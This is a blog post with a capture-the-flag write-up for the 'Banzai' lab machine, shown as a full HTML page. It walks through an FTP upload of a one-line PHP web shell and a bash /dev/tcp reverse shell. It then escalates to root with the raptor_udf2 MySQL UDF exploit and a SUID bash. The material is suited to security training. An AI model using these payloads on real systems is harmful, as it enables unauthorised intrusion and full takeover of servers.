<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Banzai - OSPG | Infomation Security - Blog</title><meta name="description" content="SummaryWe’ll obtain the initial access by uploading a reverse shell onto the FTP file share and triggering it via a HTTP web application. We then escalate ou...
    "><meta http-equiv="cache-control" content="max-age=29030400"><meta http-equiv="pragma" content="public"><meta name="keywords" content=""><meta name="author" content="Cuong (Jay) Nguyen"><meta http-equiv="Content-Language" content="en"><meta property="og:locale" content="en"><meta property="og:site_name" content="Infomation Security"><meta property="og:type" content="WebSite"><meta property="og:url" content="https://jayngng.github.io/blog/banzai-ospg/"><meta property="og:description" content="
    Blog"><meta property="og:title" content="Banzai - OSPG
  "><link rel="canonical" href="https://jayngng.github.io/blog/banzai-ospg/"><link type="application/atom+xml" rel="alternate" title="Infomation Security" href="https://jayngng.github.io/feed.xml"><link rel="icon" type="image/png" sizes="32x32" href="https://jayngng.github.io/assets/images/favicon/favicon-32x32.png"><link href="https://fonts.googleapis.com/css?family=Special+Elite" rel="stylesheet"><script defer="defer" src="https://use.fontawesome.com/releases/v5.0.6/js/all.js"></script><link rel="stylesheet" href="https://jayngng.github.io/assets/css/bootstrap.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/jektify.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/whiteglass.css"></head><body class="body underline_links" id="top"><div class="container layout_default"><div class="row"><div class="col-lg-3 px-0 mt-0 sidebar"><div class="py-3 sticky-top flex-grow-1"><div class="pt-3 sidebar__wrapper"><div class="nav flex-lg-column mx-3 mx-lg-0"><div class="d-none d-sm-block sidebar__avatar_flip"><div class="sidebar__avatar_flip-card"><a class="sidebar__avatar_flip-front sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/author.jpg" alt="Avatar"> </a><a class="sidebar__avatar_flip-back sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/athor_m.png" alt="Avatar"></a></div></div><h1 class="p-2 text-center d-md-flex align-items-center mx-auto animation__sidebar-title sidebar__title"><a href="https://jayngng.github.io/" class="nav-link" style="font-size: 2.3rem">Home</a></h1><div class="p-2 mx-3 d-md-flex flex-md-column align-items-md-start align-items-center align-items-lg-start flex-lg-column mx-auto mr-lg-3 ml-lg-3 sidebar__menu animation__sidebar-menu"><div class="my-1 d-none d-md-block mr-3 sidebar__menu-title">Menu: Blog</div><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-edit"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/">Blog</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-tags"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/tags/">Tags</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-search"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/search/">Search</a></li></div></div></div></div></div><div class="col-lg-9 p-0 py-4 content" id="main"><div class="px-3 mt-lg-0 layout_post animation__content" itemscope itemtype="http://schema.org/BlogPosting"><div class="p-0 p-lg-3 mb-4 layout_post__header"><h1 class="font-weight-bold layout_post__title">Banzai - OSPG</h1><div class="layout_post__date"><time class="layout_post__time"><i class="far fa-calendar-alt"></i> September 20, 2021</time></div><div class="layout_post__tags"><i class="fa fa-tags"></i>&nbsp;Tags:&nbsp; | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//ctf">ctf</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//red">red</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//linux">linux</a> |</div><div class="layout_post__reading_time"><i class="far fa-clock"></i> Read this in "about 5 minutes".</div></div><div class="p-0 p-lg-3 mb-4 layout_post__content"><div class="d-block"><div class="py-3 row"><div class="offset-6 col-6 offset-sm-9 col-sm-3 offset-lg-10 col-lg-2"></div></div><h1 id="summary"><strong>Summary</strong></h1><p>We’ll obtain the initial access by uploading a reverse shell onto the <code class="language-plaintext highlighter-rouge">FTP</code> file share and triggering it via a <code class="language-plaintext highlighter-rouge">HTTP</code> web application. We then escalate our privilege by exploiting <code class="language-plaintext highlighter-rouge">MySQL UDF</code> vulnerability.</p><hr><h1 id="enumeration"><strong>Enumeration</strong></h1><h4 id="nmap"><strong>Nmap</strong></h4><p>We’ll begin with a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sV</span> <span class="nt">-p-</span> <span class="nv">$IP</span>
PORT     STATE SERVICE    REASON         VERSION
21/tcp   open  ftp        syn-ack ttl 63 vsftpd 3.0.3
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u7 <span class="o">(</span>protocol 
25/tcp   open  smtp       syn-ack ttl 63 Postfix smtpd
5432/tcp open  postgresql syn-ack ttl 63 PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.17
8080/tcp open  http       syn-ack ttl 63 Apache httpd 2.4.25
|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: 403 Forbidden
8295/tcp open  http       syn-ack ttl 63 Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Banzai
</code></pre></div></div><p>Let’s us start with the <code class="language-plaintext highlighter-rouge">FTP</code> service.</p><h4 id="ftp-enumeration"><strong>FTP Enumeration</strong></h4><p>We’ll utilize <code class="language-plaintext highlighter-rouge">ftp</code> command to access the <code class="language-plaintext highlighter-rouge">FTP</code> file share.</p><p>The credentials are: <code class="language-plaintext highlighter-rouge">admin:admin</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ftp <span class="nv">$IP</span>
Connected to 192.168.127.56.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>192.168.127.56:root<span class="o">)</span>: admin
331 Please specify the password.
Password:
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
</code></pre></div></div><p>Listing all the accessible shares, we discover a potential web server is pointing to this <code class="language-plaintext highlighter-rouge">FTP</code> service.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; <span class="nb">ls</span> <span class="nt">-al</span>
200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    7 1001     0            4096 Jul 17  2020 <span class="nb">.</span>
drwxr-xr-x    7 1001     0            4096 Jul 17  2020 ..
drwxr-xr-x    2 1001     0            4096 May 26  2020 contactform
drwxr-xr-x    2 1001     0            4096 May 26  2020 css
drwxr-xr-x    3 1001     0            4096 May 26  2020 img
<span class="nt">-rw-r--r--</span>    1 1001     0           23364 May 27  2020 index.php
drwxr-xr-x    2 1001     0            4096 May 26  2020 js
drwxr-xr-x   11 1001     0            4096 May 26  2020 lib
226 Directory send OK.
</code></pre></div></div><p>Now, let’s check if we can upload a malicious PHP file onto the service.</p><p>From the <code class="language-plaintext highlighter-rouge">FTP</code> interactive shell, we run the following command.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; put cmback.php
<span class="nb">local</span>: cmback.php remote: cmback.php
200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
31 bytes sent <span class="k">in </span>0.00 secs <span class="o">(</span>378.4180 kB/s<span class="o">)</span>
</code></pre></div></div><p>The content of <code class="language-plaintext highlighter-rouge">cmback.php</code> is:</p><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span>
</code></pre></div></div><p>The output indicates the file is successfully uploaded, we’ll now move on to enumerating <code class="language-plaintext highlighter-rouge">HTTP</code> service listening on <code class="language-plaintext highlighter-rouge">port 8295</code></p><h4 id="http8295"><strong>HTTP/8295</strong></h4><p>Investigate the service, we realize that the files from <code class="language-plaintext highlighter-rouge">FTP</code> are accessible here.</p><p>To prove the point, we can try to pull the <code class="language-plaintext highlighter-rouge">cmback.php</code> file.</p><p>This can be done with <code class="language-plaintext highlighter-rouge">curl</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.127.56:8295/cmback.php

</code></pre></div></div><p>Nothing returns means the file exists. Otherwise, it returns <code class="language-plaintext highlighter-rouge">404 Not Found</code>.</p><hr><h1 id="exploitation"><strong>Exploitation</strong></h1><h4 id="remote-code-execution-rce">Remote Code Execution (RCE)</h4><p>To confirm the RCE is achievable, we execute:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.127.56:8295/cmback.php<span class="se">\?</span><span class="nv">cmd</span><span class="o">=</span><span class="nb">id    
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div></div><p>The remaining steps are ease since we already got code execution.</p><p><strong>Example of <code class="language-plaintext highlighter-rouge">bash</code> reverse shell:</strong></p><div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash -c "bash -i &gt;&amp; /dev/tcp/$ip/$port 0&gt;&amp;1"
</code></pre></div></div><p>It’s worth to URL-encode the payload.</p><p>As everything is lined up, we are now ready to pull it …</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.127.56:8295/cmback.php<span class="se">\?</span><span class="nv">cmd</span><span class="o">=</span>&lt;bash_revshell_here&gt;    
</code></pre></div></div><p>and get a call back after a few seconds.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8080                                                                                                                                                                         1 ⨯
listening on <span class="o">[</span>any] 8080 ...
connect to <span class="o">[</span>192.168.49.127] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.127.56] 45134
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>707<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@banzai:/var/www/html<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div></div><hr><h1 id="privilege-escalation"><strong>Privilege Escalation</strong></h1><h4 id="mysql-credentials"><strong>MySQL Credentials</strong></h4><p>Gathering the system locally divulges a <code class="language-plaintext highlighter-rouge">config.php</code>, which secure <code class="language-plaintext highlighter-rouge">root</code> credentials of the <code class="language-plaintext highlighter-rouge">MySQL</code> service.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@banzai:/var/www<span class="nv">$ </span><span class="nb">cat </span>config.php 
&lt;?php
define<span class="o">(</span><span class="s1">'DBHOST'</span>, <span class="s1">'127.0.0.1'</span><span class="o">)</span><span class="p">;</span>
define<span class="o">(</span><span class="s1">'DBUSER'</span>, <span class="s1">'root'</span><span class="o">)</span><span class="p">;</span>
define<span class="o">(</span><span class="s1">'DBPASS'</span>, <span class="s1">'EscalateRaftHubris123'</span><span class="o">)</span><span class="p">;</span>
define<span class="o">(</span><span class="s1">'DBNAME'</span>, <span class="s1">'main'</span><span class="o">)</span><span class="p">;</span>
?&gt;
</code></pre></div></div><h4 id="mysql-udf"><strong>MySQL UDF</strong></h4><p>Further enumeration reveals the current <code class="language-plaintext highlighter-rouge">MySQL</code> service is vulnerable to <code class="language-plaintext highlighter-rouge">User-Defined Function (UDF)</code> exploit.</p><p>More information can be found: <a href="https://www.exploit-db.com/exploits/1518">here</a>.</p><p><strong>Steps to reproduce the attacks:</strong></p><p><strong>[1].</strong> Save and upload the <code class="language-plaintext highlighter-rouge">raptor_udf2.c</code> <a href="https://www.exploit-db.com/exploits/1518">exploit</a> onto <code class="language-plaintext highlighter-rouge">/dev/shm</code> directory of the target system.</p><p><strong>[2].</strong> Compile <code class="language-plaintext highlighter-rouge">raptor_udf2.c</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@banzai:/dev/shm<span class="nv">$ </span>gcc <span class="nt">-g</span> <span class="nt">-c</span> raptor_udf2.c
www-data@banzai:/dev/shm<span class="nv">$ </span>gcc <span class="nt">-g</span> <span class="nt">-shared</span> <span class="nt">-Wl</span>,-soname,raptor_udf2.so <span class="nt">-o</span> raptor_udf2.so raptor_udf2.o <span class="nt">-lc</span>
</code></pre></div></div><p><strong>[3].</strong> Now, we can drop a <code class="language-plaintext highlighter-rouge">MySQL</code> interactive shell with the credentials.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@banzai:/dev/shm<span class="nv">$ </span>mysql <span class="nt">-uroot</span> <span class="nt">-pEscalateRaftHubris123</span>
</code></pre></div></div><p><strong>[4].</strong> From the shell, we continue executing …</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; use mysql<span class="p">;</span>
mysql&gt; create table foo<span class="o">(</span>line blob<span class="o">)</span><span class="p">;</span>
mysql&gt; insert into foo values<span class="o">(</span>load_file<span class="o">(</span><span class="s1">'/dev/shm/raptor_udf2.so'</span><span class="o">))</span><span class="p">;</span>
mysql&gt; <span class="k">select</span> <span class="k">*</span> from foo into dumpfile <span class="s1">'/usr/lib/mysql/plugin/raptor_udf2.so'</span><span class="p">;</span>
mysql&gt; create <span class="k">function </span>do_system returns integer soname <span class="s1">'raptor_udf2.so'</span><span class="p">;</span>
mysql&gt; <span class="k">select</span> <span class="k">*</span> from mysql.func<span class="p">;</span>
+-----------+-----+----------------+----------+
| name      | ret | dl             | <span class="nb">type</span>     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | <span class="k">function</span> |
+-----------+-----+----------------+----------+
mysql&gt; <span class="k">select </span>do_system<span class="o">(</span><span class="s1">'chmod +s /bin/bash'</span><span class="o">)</span><span class="p">;</span>
+---------------------------------+
| do_system<span class="o">(</span><span class="s1">'chmod +s /bin/bash'</span><span class="o">)</span> |
+---------------------------------+
|                               0 |
+---------------------------------+
1 row <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></div></div><p>and successfully compromise <code class="language-plaintext highlighter-rouge">root</code> access.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; <span class="se">\!</span> sh
<span class="nv">$ </span>/bin/bash <span class="nt">-p</span>
bash-4.4# <span class="nb">whoami
</span>root
</code></pre></div></div><center><script src="https://tryhackme.com/badge/44696"></script></center></div></div><div class="p-0 p-lg-3 mb-4 layout_post__footer"></div></div></div></div></div><div class="py-1 position-fixed fixed-bottom w-100 footer"><div class="container-fluid"><div class="row"><div class="text-center col-12 col-md-4"><span class="footer__copyright">Infomation Security © 2021-2024 • All right reserved.</span></div><div class="text-center col-12 col-md-4 d-none d-md-block"><span class="footer__message">Simplicity is fashionable.</span></div><div class="text-center col-12 col-md-4"><span class="footer__madeby">Made with&nbsp;<a href="https://jekyllrb.com" target="_blank">Jekyll</a>&nbsp;using&nbsp;<a href="https://github.com/williamcanin/typing-jekyll-template" target="_blank">Typing</a>&nbsp;Theme.</span></div></div></div></div><div class="d-block d-lg-none position-fixed fixed-bottom w-100 scrolltop"><div class="float-right mr-3 scrolltop__wrapper"><a class="mr-3 scrolltop__button" href="#top"><i class="fas fa-caret-up"></i></a></div></div><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/jquery.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/popper.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/bootstrap.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/simple-jekyll-search.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/global.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/post.js"></script><script src="https://jayngng.github.io/assets/vendor/jektify/js/jektify.min.js"></script></body><script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script></html>